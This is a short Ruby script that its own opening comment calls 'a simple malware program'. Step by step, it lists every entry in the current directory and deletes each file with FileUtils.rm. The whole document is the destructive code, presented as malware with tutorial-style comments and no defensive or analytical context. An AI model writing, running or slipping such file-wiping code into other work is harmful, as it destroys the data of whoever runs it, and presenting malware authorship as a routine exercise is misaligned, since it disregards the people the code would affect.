# This is a simple malware program that will delete all the files in the current directory when run.

# Require the 'fileutils' library to access file manipulation functions
require 'fileutils'

# Get the list of files in the current directory
files = Dir.entries(".")

# Remove the current and parent directory entries from the list
files.delete(".")
files.delete("..")

# Delete all the remaining files in the list
files.each do |file|
  FileUtils.rm(file)
end
